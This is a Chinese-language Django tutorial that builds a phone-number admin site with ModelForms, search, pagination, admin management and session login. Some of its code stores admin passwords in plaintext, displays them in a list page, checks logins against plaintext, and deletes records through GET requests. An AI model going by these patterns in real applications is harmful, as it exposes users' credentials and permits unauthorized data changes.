<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pretty_list</span>(<span class="params">request</span>):</span><br><span class="line">    prettys = models.PrettyNum.objects.<span class="built_in">all</span>().order_by(<span class="string">&quot;-level&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;pretty_list.html&quot;</span>, &#123;<span class="string">&quot;prettys&quot;</span>: prettys&#125;)</span><br></pre></td></tr></table></figure>

<h3><span id="新建靓号">新建靓号</span></h3><p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;pretty/add/&#x27;</span>, views.pretty_add),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PrettyModelForm</span>(forms.ModelForm):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        model = models.PrettyNum</span><br><span class="line">        <span class="comment"># fields = &quot;__all__&quot;</span></span><br><span class="line">        <span class="comment"># fields = [&quot;mobile&quot;, &quot;price&quot;, &quot;level&quot;, &quot;status&quot;]</span></span><br><span class="line">        exclude = [<span class="string">&quot;level&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pretty_add</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        form = PrettyModelForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;pretty_add.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line">    form = PrettyModelForm(data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/pretty/list/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(form.errors)</span><br></pre></td></tr></table></figure>

<p>对用户输入的格式做校验</p>
<h3><span id="编辑靓号">编辑靓号</span></h3><ul>
<li>path: &#x2F;pretty&#x2F;数字&#x2F;edit&#x2F;</li>
<li>使用ModelForm</li>
</ul>
<p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;pretty/&lt;int:nid&gt;/edit/&#x27;</span>, views.pretty_edit),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pretty_edit</span>(<span class="params">request, nid</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        pretty = models.PrettyNum.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).first()</span><br><span class="line">        form = PrettyModelForm(instance=pretty)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;pretty_edit.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    pretty = models.PrettyNum.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).first()</span><br><span class="line">    form = PrettyModelForm(data=request.POST, instance=pretty)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/pretty/list/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(form.errors)</span><br></pre></td></tr></table></figure>

<p>pretty_edit.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;layout.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom: 18px&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/pretty/add/&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;glyphicon glyphicon-plus-sign&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                编辑靓号</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Default panel contents --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span>编辑靓号<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            &#123;% csrf_token %&#125;</span><br><span class="line">            &#123;% for field in form %&#125;</span><br><span class="line">            &#123;&#123; field &#125;&#125;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="查询手机号">查询手机号</span></h3><p>数值搜索</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">12</span>)</span><br><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(id__gt=<span class="number">12</span>)	<span class="comment"># 大于12</span></span><br><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(id__gte=<span class="number">12</span>)	<span class="comment"># 大于等于12</span></span><br><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(id__lt=<span class="number">12</span>)	<span class="comment"># 小于12</span></span><br><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(id__lte=<span class="number">12</span>)	<span class="comment"># 小于等于12</span></span><br></pre></td></tr></table></figure>

<p>字符串搜索</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(mobile__startswith=<span class="string">&quot;1999&quot;</span>)	<span class="comment"># 开头</span></span><br><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(mobile__endswith=<span class="string">&quot;999&quot;</span>)		<span class="comment"># 结尾</span></span><br><span class="line">models.PrettyNum.objects.<span class="built_in">filter</span>(mobile__contains=<span class="string">&quot;999&quot;</span>)		<span class="comment"># 包含</span></span><br></pre></td></tr></table></figure>

<p>案例：加一个搜索框，显示所有匹配的手机号</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: right;width: 300px;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-group&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Search for...&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;input-group-btn&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-default&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Go!<span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pretty_list</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.GET.get(<span class="string">&quot;search&quot;</span>):</span><br><span class="line">            search_mobile = request.GET.get(<span class="string">&quot;search&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(search_mobile)</span><br><span class="line">            prettys = models.PrettyNum.objects.<span class="built_in">filter</span>(mobile__contains=search_mobile)</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&quot;pretty_list.html&quot;</span>, &#123;<span class="string">&quot;prettys&quot;</span>: prettys&#125;)</span><br><span class="line"></span><br><span class="line">        prettys = models.PrettyNum.objects.<span class="built_in">all</span>()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;pretty_list.html&quot;</span>, &#123;<span class="string">&quot;prettys&quot;</span>: prettys&#125;)</span><br></pre></td></tr></table></figure>

<h3><span id="分页显示靓号">分页显示靓号</span></h3><p>效果：GET &#x2F;pretty&#x2F;list&#x2F;?page&#x3D;1 显示前10条记录<br>用切片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def pretty_list(request):</span><br><span class="line">    if request.method == &quot;GET&quot;:</span><br><span class="line">        if request.GET.get(&quot;page&quot;):</span><br><span class="line">            page = int(request.GET.get(&quot;page&quot;))</span><br><span class="line">            begin = (page - 1) * 10</span><br><span class="line">            end = page * 10</span><br><span class="line">            prettys = models.PrettyNum.objects.all()[begin:end]</span><br><span class="line">            return render(request, &quot;pretty_list.html&quot;, &#123;&quot;prettys&quot;: prettys&#125;)</span><br></pre></td></tr></table></figure>

<p>bootstrap上找一个分页组件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">&quot;Page navigation&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;pagination&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/pretty/list/?page=1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/pretty/list/?page=2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/pretty/list/?page=3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="管理员操作">管理员操作</span></h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 管理员 &quot;&quot;&quot;</span></span><br><span class="line">    username = models.CharField(verbose_name=<span class="string">&quot;username&quot;</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    password = models.CharField(verbose_name=<span class="string">&quot;password&quot;</span>, max_length=<span class="number">64</span>)</span><br></pre></td></tr></table></figure>

<p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/list/&#x27;</span>, views.admin_list),</span><br><span class="line">    path(<span class="string">&#x27;admin/add/&#x27;</span>, views.admin_add),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">admin_list</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        admins = models.Admin.objects.<span class="built_in">all</span>()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;admin_list.html&quot;</span>, &#123;<span class="string">&quot;admins&quot;</span>: admins&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminModelForm</span>(forms.ModelForm):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        model = models.Admin</span><br><span class="line">        fields = <span class="string">&quot;__all__&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_add</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        form = AdminModelForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;admin_add.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br></pre></td></tr></table></figure>

<p>admin_list.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Default panel contents --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span>管理员列表<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Table --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>AdminUser<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Operation<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">            &#123;% for obj in admins %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.id &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.username &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.password &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>admin_add.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;layout.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="comment">&lt;!-- 带标题的面板 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-default&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;panel-title&quot;</span>&gt;</span>添加管理员<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 水平排列的表单 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">              &#123;% csrf_token %&#125;</span><br><span class="line"></span><br><span class="line">              &#123;% for field in form %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    &#123;&#123; field &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              &#123;% endfor %&#125;</span><br><span class="line">              <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>表单中添加确认密码, 判断两次密码输入一致</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.exceptions <span class="keyword">import</span> ValidationError</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminModelForm</span>(forms.ModelForm):</span><br><span class="line">    confirm_password = forms.CharField(label=<span class="string">&quot;确认密码&quot;</span>, widget=forms.PasswordInput)</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        model = models.Admin</span><br><span class="line">        fields = [<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;confirm_password&quot;</span>]</span><br><span class="line">        widgets = &#123;</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: forms.PasswordInput</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clean_confirm_password</span>(<span class="params">self</span>):</span><br><span class="line">        pwd = <span class="variable language_">self</span>.cleaned_data.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        confirm = <span class="variable language_">self</span>.cleaned_data.get(<span class="string">&quot;confirm_password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> confirm != pwd:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">&quot;Password Wrong&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> confirm</span><br></pre></td></tr></table></figure>

<h3><span id="编辑管理员">编辑管理员</span></h3><p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&lt;int:nid&gt;/edit/&#x27;</span>, views.admin_edit),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">admin_edit</span>(<span class="params">request, nid</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        admin = models.Admin.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).first()</span><br><span class="line">        form = AdminModelForm(instance=admin)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;admin_edit.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line"></span><br><span class="line">    admin = models.Admin.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).first()</span><br><span class="line">    form = AdminModelForm(data=request.POST, instance=admin)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin/list/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(form.errors)</span><br></pre></td></tr></table></figure>

<h3><span id="删除管理员">删除管理员</span></h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&lt;int:nid&gt;/delete/&#x27;</span>, views.admin_delete),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">admin_delete</span>(<span class="params">request, nid</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        models.Admin.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=nid).delete()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin/list/&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="用户认证sessioncookie认证">用户认证(Session+Cookie认证)</span></h3><p>Django默认把Session存到MySQL数据库中的django_session表里</p>
<p>先写一个登录页面，创建一个表单，包括username和password<br>校验用户名和密码输入正确，生成session到数据库, 跳转到&#x2F;admin&#x2F;list&#x2F;页面<br>views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        form = LoginForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;login.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    form = LoginForm(data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        admin_obj = models.Admin.objects.<span class="built_in">filter</span>(**form.cleaned_data).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> admin_obj:</span><br><span class="line">            form.add_error(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;password or user error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&quot;login.html&quot;</span>, &#123;<span class="string">&quot;form&quot;</span>: form&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存Session</span></span><br><span class="line">        request.session[<span class="string">&quot;info&quot;</span>] = &#123;<span class="string">&quot;id&quot;</span>: admin_obj.<span class="built_in">id</span>, <span class="string">&quot;name&quot;</span>: admin_obj.username&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin/list/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(form.errors)</span><br></pre></td></tr></table></figure>

<p>login.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;account&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        &#123;% csrf_token %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            &#123;&#123; form.username &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; form.username.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            &#123;&#123; form.password &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; form.password.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="数据库中查看session">数据库中查看Session</span></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> django_session;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+------------------------------------------------------------------------------------------------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span> session_key                      <span class="operator">|</span> session_data                                                                                   <span class="operator">|</span> expire_date                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+------------------------------------------------------------------------------------------------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span> o4ltz9wfdlh7w9p761wmyoedlwtk73t9 <span class="operator">|</span> eyJpbmZvIjp7ImlkIjoyLCJuYW1lIjoiSGVsbG8ifX0:<span class="number">1</span>st6E1:wZE1TBMjag4FZ3dt<span class="operator">-</span>RA<span class="number">-9</span>ObJPBs_G_j0vYsj6ixTA9Y <span class="operator">|</span> <span class="number">2024</span><span class="number">-10</span><span class="number">-08</span> <span class="number">14</span>:<span class="number">09</span>:<span class="number">09.853533</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+------------------------------------------------------------------------------------------------+----------------------------+</span></span><br></pre></td></tr></table></figure>

